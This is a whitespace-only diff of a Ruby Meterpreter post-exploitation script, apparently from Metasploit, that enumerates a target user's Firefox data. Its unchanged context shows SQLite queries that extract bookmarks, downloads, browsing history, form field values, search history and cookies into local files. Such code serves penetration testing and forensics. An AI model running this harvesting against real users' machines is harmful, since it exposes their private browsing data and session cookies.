@@ -1,6 +1,6 @@
 #
 # $Id: enum_firefox.rb 9770 2010-07-10 20:00:32Z darkoperator $
-# $Revision$
+# $Revision: $
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
@@ -52,24 +52,24 @@ def frfxdmp(usrnm)
 	cookies = []
 	formvals = ''
 	searches = ''
-  	results = ''
-  	placesdb = @logs + ::File::Separator + usrnm + "places.sqlite"
-  	formdb = @logs + ::File::Separator + usrnm + "formhistory.sqlite"
-  	searchdb = @logs + ::File::Separator + usrnm + "search.sqlite"
-  	cookiesdb = @logs + ::File::Separator + usrnm + "cookies.sqlite"
+	results = ''
+	placesdb = @logs + ::File::Separator + usrnm + "places.sqlite"
+	formdb = @logs + ::File::Separator + usrnm + "formhistory.sqlite"
+	searchdb = @logs + ::File::Separator + usrnm + "search.sqlite"
+	cookiesdb = @logs + ::File::Separator + usrnm + "cookies.sqlite"
 	bookmarks = @logs + ::File::Separator + usrnm + "_bookmarks.txt"
 	download_list = @logs + ::File::Separator + usrnm + "_download_list.txt"
 	url_history = @logs + ::File::Separator + usrnm + "_history.txt"
 	form_history = @logs + ::File::Separator + usrnm + "_form_history.txt"
 	search_history = @logs + ::File::Separator + usrnm + "_search_history.txt"
-  	begin
+	begin
 		print_status("\tGetting Firefox Bookmarks for #{usrnm}")
 		db = SQLite3::Database.new(placesdb)
 		#print_status("\tProcessing #{placesdb}")
 
 		db.execute('select a.url from moz_places a, moz_bookmarks b, '+
-			  'moz_bookmarks_roots c where a.id=b.fk and parent=2'+
-			  ' and folder_id=2 and a.hidden=0')do |row|
+			'moz_bookmarks_roots c where a.id=b.fk and parent=2'+
+			' and folder_id=2 and a.hidden=0') do |row|
 			bkmrks << row
 		end
 		print_status("\tSaving to #{bookmarks}")
@@ -77,8 +77,8 @@ def frfxdmp(usrnm)
 			bkmrks.each do |b|
 				file_local_write(bookmarks,"\t#{b.to_s}\n")
 			end
-	  	else
-	    		print_status("\tIt appears that there are no bookmarks for this account")
+		else
+			print_status("\tIt appears that there are no bookmarks for this account")
 		end
 	rescue::Exception => e
 		print_status("The following Error was encountered: #{e.class} #{e}")
@@ -87,17 +87,17 @@ def frfxdmp(usrnm)
 	begin
 		print_status("\tGetting list of Downloads using Firefox made by #{usrnm}")
 		db.execute('SELECT url FROM moz_places, moz_historyvisits ' +
-			  'WHERE moz_places.id = moz_historyvisits.place_id '+
-			  'AND visit_type = "7" ORDER by visit_date') do |row|
+			'WHERE moz_places.id = moz_historyvisits.place_id '+
+			'AND visit_type = "7" ORDER by visit_date') do |row|
 			dnldsmade << row
 		end
-	  	print_status("\tSaving Download list to #{download_list}")
+		print_status("\tSaving Download list to #{download_list}")
 		if dnldsmade.length != 0
 			dnldsmade.each do |d|
 				file_local_write(download_list,"\t#{d.to_s} \n")
 			end
-	  	else
-	    		print_status("\tIt appears that downloads where cleared for this account")
+		else
+			print_status("\tIt appears that downloads where cleared for this account")
 		end
 	rescue::Exception => e
 		print_status("The following Error was encountered: #{e.class} #{e}")
@@ -106,8 +106,8 @@ def frfxdmp(usrnm)
 	begin
 		print_status("\tGetting Firefox URL History for #{usrnm}")
 		db.execute('SELECT DISTINCT url FROM moz_places, moz_historyvisits ' +
-			  'WHERE moz_places.id = moz_historyvisits.place_id ' +
-			  'AND visit_type = "1" ORDER by visit_date' ) do |row|
+			'WHERE moz_places.id = moz_historyvisits.place_id ' +
+			'AND visit_type = "1" ORDER by visit_date' ) do |row|
 			sitesvisited << row
 		end
 		print_status("\tSaving URL History to #{url_history}")
@@ -115,8 +115,8 @@ def frfxdmp(usrnm)
 			sitesvisited.each do |s|
 				file_local_write(url_history,"\t#{s.to_s}\n")
 			end
-	  	else
-	    		print_status("\tIt appears that Browser History has been cleared")
+		else
+			print_status("\tIt appears that Browser History has been cleared")
 		end
 		db.close
 	rescue::Exception => e
@@ -130,11 +130,11 @@ def frfxdmp(usrnm)
 		db.execute("SELECT fieldname,value FROM moz_formhistory") do |row|
 			formvals << "\tField: #{row[0]} Value: #{row[1]}\n"
 		end
-	  	print_status("\tSaving Firefox Form History to #{form_history}")
+		print_status("\tSaving Firefox Form History to #{form_history}")
 		if formvals.length != 0
 			file_local_write(form_history,formvals)
-	  	else
-	    		print_status("\tIt appears that Form History has been cleared")
+		else
+			print_status("\tIt appears that Form History has been cleared")
 		end
 		db.close
 	rescue::Exception => e
@@ -148,11 +148,11 @@ def frfxdmp(usrnm)
 		db.execute("SELECT name,value FROM engine_data") do |row|
 			searches << "\tField: #{row[0]} Value: #{row[1]}\n"
 		end
-	  	print_status("\tSaving Firefox Search History to #{search_history}")
+		print_status("\tSaving Firefox Search History to #{search_history}")
 		if searches.length != 0
 			file_local_write(search_history,searches)
-	  	else
-	    		print_status("\tIt appears that Search History has been cleared")
+		else
+			print_status("\tIt appears that Search History has been cleared")
 		end
 		db.close
 	rescue::Exception => e
@@ -176,7 +176,7 @@ def frfxdmp(usrnm)
 		fd.puts "isHttpOnly: " + item[8].to_s + "\n"
 		fd.close
 	end
-  	return results
+	return results
 end
 #-------------------------------------------------------------------------------
 #Function for getting password files
